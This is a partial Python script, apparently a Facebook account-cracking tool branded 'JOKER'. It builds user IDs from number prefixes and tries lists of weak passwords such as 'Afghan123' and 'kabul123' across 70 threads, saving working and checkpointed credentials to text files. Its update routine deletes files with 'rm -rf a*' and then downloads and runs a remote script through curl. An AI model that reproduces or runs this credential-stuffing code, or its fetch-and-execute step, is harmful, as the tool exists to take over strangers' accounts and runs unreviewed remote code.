...
\33[1;37m----------------------------------------------
→   Owner      :  𝗠𝗥 𝗞𝗢𝗞𝗢 𝗝𝗢𝗞𝗘𝗥 
→  Facebook :  𝗛𝗗 𝗦𝗛𝗔𝗛𝗜 𝗝𝗢𝗞𝗘𝗥 
→TELEGRAM: 𝗡𝗢 𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠
→   Tools       :  𝗠𝗥 𝗢𝗞 𝗝𝗢𝗞𝗘𝗥 
...
try:
    ...
    if str(v) in update:
        os.system('rm -rf a*')
        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/JOKER.py > JOKER.py')
        os.system('python JOKER.py')
    else:pass
...
def riaz():
	...
	if riaz1 =='5':
		riaz()
	if riaz1 =='4':
		os.system('xdg-open http://wa.me/+937266012text=SN.JAN💜🐰Sir😪💕')
	if riaz1 =='3':
		os.system('xdg-openhttps://www.facebook.com/kanokwan.plengien');riaz()
	if riaz1 =='2':
		bangla()
	else:
...
def m1():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru+guru,'Afghan123','AfJOKERstan','afghan12345','kabul123','100200']
...
def m2():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfJOKERstan','Afghan12345','kabul123','۱۲۳۴۵۶']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
...
def m3():
    ...
    with ThreadPool(max_workers=70) as yaari:
        ...
        for guru in user:
            uid = kode+guru
            pwx=[guru,'Afghan123','AfJOKERstan','Afghan12345','kabul123','Ahmad123']
            yaari.submit(rcrack,uid,pwx,tl)
    print(46*'-')
    print('IDZ SAVED IN OK.txt : CP.txt')
    print(46*'-')
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                open('JOKER-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:152]
                print('\033[1;31m[JOKER-CP] '+uid+' | '+ps+'\x1b[1;97m')
                open('JOKER-CP.txt', 'a').write(uid+' | '+ps+'\n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r[\033[1;97mJOKER-KHAN\033[1;97m] %s|\33[1;32mOK:- %s \r'%(loop,len(oks))),
        sys.stdout.flush()
    except:
        pass
